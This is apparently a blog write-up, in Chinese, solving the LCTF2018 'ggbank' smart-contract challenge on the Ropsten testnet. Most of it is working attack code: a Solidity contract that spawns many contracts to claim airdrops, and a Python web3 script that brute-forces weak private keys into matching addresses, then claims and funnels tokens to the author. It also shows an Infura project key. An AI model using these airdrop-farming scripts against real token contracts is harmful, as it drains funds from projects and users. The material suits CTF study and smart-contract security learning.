---
title: LCTF2018 ggbank 薅羊毛实战
date: 2018-11-20 15:59:54
tags:
- ctf
- 智能合约
---

11.18号结束的LCTF2018中有一个很有趣的智能合约题目叫做ggbank，题目的原意是考察弱随机数问题，但在题目的设定上挺有意思的，加入了一个对地址的验证，导致弱随机的难度高了许多，反倒是薅羊毛更快乐了，下面就借这个题聊聊关于薅羊毛的实战操作。

<!--more-->

# 分析

源代码
[https://ropsten.etherscan.io/address/0x7caa18d765e5b4c3bf0831137923841fe3e7258a#code](https://ropsten.etherscan.io/address/0x7caa18d765e5b4c3bf0831137923841fe3e7258a#code)

首先我们照例来分析一下源代码

和之前我出的题风格一致，首先是发行了一种token，然后基于token的挑战代码，主要有几个点
```
modifier authenticate { //修饰器，在authenticate关键字做修饰器时，会执行该函数
    require(checkfriend(msg.sender));_; // 对来源做checkfriend判断
}
```

跟着看checkfriend函数
```
function checkfriend(address _addr) internal pure returns (bool success) {
    bytes20 addr = bytes20(_addr);
    bytes20 id = hex"000000000000000000000000000000000007d7ec";
    bytes20 gg = hex"00000000000000000000000000000000000fffff";

    for (uint256 i = 0; i < 34; i++) { //逐渐对比最后5位
        if (addr & gg == id) { // 当地址中包含7d7ec时可以继续
            return true;
        }
        gg <<= 4;
        id <<= 4;
    }

    return false;
}
```

checkfriend就是整个挑战最大的难点，也大幅度影响了思考的方向，这个稍后再谈。

```
    function getAirdrop() public authenticate returns (bool success){
		 if (!initialized[msg.sender]) { //空投
            initialized[msg.sender] = true;
            balances[msg.sender] = _airdropAmount;
            _totalSupply += _airdropAmount;
        }
        return true;
	}
```

空投函数没看有什么太可说的，就是对每一个新用户都发一次空投。

然后就是goodluck函数
```
function goodluck()  public payable authenticate returns (bool success) {
    require(!locknumber[block.number]); //判断block.numbrt
    require(balances[msg.sender]>=100); //余额大于100
    balances[msg.sender]-=100; //每次调用要花费100token
    uint random=uint(keccak256(abi.encodePacked(block.number))) % 100; //随机数
    if(uint(keccak256(abi.encodePacked(msg.sender))) % 100 == random){ //随机数判断
        balances[msg.sender]+=20000;
        _totalSupply +=20000;
        locknumber[block.number] = true;
    }
    return true;
}
```

然后只要余额大于200000就可以拿到flag。

其实代码特别简单，漏洞也不难，就是非常常见的弱随机数问题。

随机数的生成方式为
```
uint random=uint(keccak256(abi.encodePacked(block.number))) % 100;
```

另一个的生成方式为
```
uint(keccak256(abi.encodePacked(msg.sender))) % 100
```

其实非常简单，这两个数字都是已知的，msg.sender可以直接控制已知的地址，那么左值就是已知的，剩下的就是要等待一个右值出现，由于block.number是自增的，我们可以通过提前计算出一个block.number，然后写脚本监控这个值出现，提前开始发起交易抢打包，就ok了。具体我就不详细提了。可以看看出题人的wp。

[https://github.com/LCTF/LCTF2018/tree/master/Writeup/gg%20bank](https://github.com/LCTF/LCTF2018/tree/master/Writeup/gg%20bank)

但问题就在于，这种操作要等block.number出现，而且还要抢打包，毕竟还是不稳定的。所以在做题的时候我们关注到另一条路，**薅羊毛**，这里重点说说这个。

# 合约薅羊毛 #

在想到原来的思路过于复杂之后，我就顺理成章的想到薅羊毛这条路，然后第一反正就是直接通过合约建合约的方式来碰这个概率。

思路来自于最早发现的薅羊毛合约[https://paper.seebug.org/646/](https://paper.seebug.org/646/)

这个合约有几个很精巧的点。

首先我们需要有基本的概念，**在以太坊上发起交易是需要支付gas的**，如果我们不通过合约来交易，那么这笔gas就必须先转账过去eth，然后再发起交易，整个过程困难了好几倍不止。

然后就有了新的问题，在合约中新建合约在EVM中，是属于高消费的操作之一，**在以太坊中，每一次交易都会打包进一个区块中，而每一个区块都有gas消费的上限，如果超过了上限，就会爆gas out，然后交易回滚，交易就失败了。**

```
contract attack{
    address target = 0x7caa18D765e5B4c3BF0831137923841FE3e7258a;
    
    function checkfriend(address _addr) internal pure returns (bool success) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000007d7ec";
        bytes20 gg = hex"00000000000000000000000000000000000fffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & gg == id) {
                return true;
            }
            gg <<= 4;
            id <<= 4;
        }

        return false;
    }

    
    function attack(){
        // getairdrop
        
        if(checkfriend(address(this))){
            target.call(bytes4(keccak256('getAirdrop()')));
            target.call(bytes4(keccak256("transfer(address,uint256)")),0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C, 1000);
        }
    }
}

contract doit{
    
    function doit() payable {
        
    }
     function attack_starta() public {
        for(int i=0;i<=50;i++){
            new attack();
        }
    }
    
    function () payable {
    }
    
}
```

上述的poc中，有一个很特别的点就是我加入了checkfriend的判断，因为我发现循环中如果新建合约的函数调用revert会导致整个交易报错，所以我干脆把整个判断放上来，在判断后再发起交易。

可问题来了，我尝试跑了几波之后发现完全不行，我忽略了一个问题。

让我们回到checkfriend
```
 function checkfriend(address _addr) internal pure returns (bool success) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000007d7ec";
        bytes20 gg = hex"00000000000000000000000000000000000fffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & gg == id) {
                return true;
            }
            gg <<= 4;
            id <<= 4;
        }

        return false;
    }
```

checkfriend只接受地址中带有7d7ec的地址交易，光是这几个字母出现的概率就只有`1/36*1/36*1/36*1/36*1/36`这个几率在每次随机生成50个合约上计算的话，概率就太小了。

必须要找新的办法来解决才行。

# python脚本解决方案 #

既然在合约上没办法，那么我直接换用python写脚本来解决。

这个挑战最大的问题就在于checkfriend这里，那么我们直接换一种思路，如果我们去爆破私钥去恢复地址，是不是更有效一点儿？

其实爆破的方式非常多，但有的恢复特别慢，也不知道瓶颈在哪，在换了几种方式之后呢，我终于找到了一个特别快的恢复方式。

```
from ethereum.utils import privtoaddr, encode_hex

for i in range(1000000,100000000):
        private_key = "%064d" % i
        address = "0x" + encode_hex(privtoaddr(private_key))
```

我们拿到了地址之后就简单了，首先先转0.01eth给它，然后用私钥发起交易，获得空投、转账回来。

需要注意的是，转账之后需要先等到转账这个交易打包成功，之后才能继续下一步交易，需要多设置一步等待。

有个更快的方案是，先跑出200个地址，然后再批量转账，最后直接跑起来，不过想了一下感觉其实差不太多，因为整个脚本跑下来也就不到半小时，速度还是很可观的。

脚本如下
```
import ecdsa
import sha3
from binascii import hexlify, unhexlify
from ethereum.utils import privtoaddr, encode_hex
from web3 import Web3
import os
import traceback
import time

my_ipc = Web3.HTTPProvider("https://ropsten.infura.io/v3/6528deebaeba45f8a0d005b570bef47d")
assert my_ipc.isConnected()
w3 = Web3(my_ipc)

target = "0x7caa18D765e5B4c3BF0831137923841FE3e7258a"

ggbank = [
    {
        "constant": True,
        "inputs": [],
        "name": "name",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "name": "balances",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "INITIAL_SUPPLY",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "decimals",
        "outputs": [
            {
                "name": "",
                "type": "uint8"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "_totalSupply",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "_airdropAmount",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [
            {
                "name": "owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "symbol",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "success",
                "type": "bool"
            }
        ],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {
                "name": "b64email",
                "type": "string"
            }
        ],
        "name": "PayForFlag",
        "outputs": [
            {
                "name": "success",
                "type": "bool"
            }
        ],
        "payable": True,
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [],
        "name": "getAirdrop",
        "outputs": [
            {
                "name": "success",
                "type": "bool"
            }
        ],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [],
        "name": "goodluck",
        "outputs": [
            {
                "name": "success",
                "type": "bool"
            }
        ],
        "payable": True,
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": False,
        "inputs": [
            {
                "indexed": False,
                "name": "b64email",
                "type": "string"
            },
            {
                "indexed": False,
                "name": "back",
                "type": "string"
            }
        ],
        "name": "GetFlag",
        "type": "event"
    }
]

mytarget = "0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C"
mytarget_private_key = 这是私钥


transaction_dict = {'chainId': 3,
                    'from':Web3.toChecksumAddress(mytarget),
                    'to':'', # empty address for deploying a new contract
                    'gasPrice':10000000000, 
                    'gas':200000,
                    'nonce': None,
                    'value':10000000000000000,
                    'data':""}


ggbank_ins = w3.eth.contract(abi=ggbank)
ggbank_ins = ggbank_ins(address=Web3.toChecksumAddress(target))

nonce = 0

def transfer(address, private_key):
    print(address)
    global nonce
    # 发钱
    if not nonce:
        nonce = w3.eth.getTransactionCount(Web3.toChecksumAddress(mytarget))

    transaction_dict['nonce'] = nonce
    transaction_dict['to'] = Web3.toChecksumAddress(address)
    signed = w3.eth.account.signTransaction(transaction_dict, mytarget_private_key)
    result = w3.eth.sendRawTransaction(signed.rawTransaction)

    nonce +=1

    while 1:
        if w3.eth.getBalance(Web3.toChecksumAddress(address)) >0:
            break
        time.sleep(1)

    # 空投
    nonce2 = w3.eth.getTransactionCount(Web3.toChecksumAddress(address))

    transaction2 = ggbank_ins.functions.getAirdrop().buildTransaction({'chainId': 3, 'gas': 200000, 'nonce': nonce2, 'gasPrice': w3.toWei('1', 'gwei')})
    print(transaction2)
    signed2 = w3.eth.account.signTransaction(transaction2, private_key)

    result2 = w3.eth.sendRawTransaction(signed2.rawTransaction)

    # 转账
    nonce2+=1

    transaction3 = ggbank_ins.functions.transfer(mytarget, int(1000)).buildTransaction({'chainId': 3, 'gas': 200000, 'nonce': nonce2, 'gasPrice': w3.toWei('1', 'gwei')})
    print(transaction3)

    signed3 = w3.eth.account.signTransaction(transaction3, private_key)

    result3 = w3.eth.sendRawTransaction(signed3.rawTransaction)



if __name__ == '__main__':

    j = 0
    for i in range(1000000,100000000):
        private_key = "%064d" % i
        # address = create_address(private_key)
        # print(address)
        # if "7d7ec" in address:
        #     print(address)

        address = "0x" + encode_hex(privtoaddr(private_key))

        if "7d7ec" in address:
            private_key = unhexlify(private_key)
            print(j)
            try:
                transfer(address, private_key)
            except:
                traceback.print_exc()
                print("error:"+str(j))
            j+=1

```

最终效果显著

![image.png-8.3kB][1]


  [1]: http://static.zybuluo.com/LoRexxar/89eepzp81mzw31l8fhf737k8/image.png
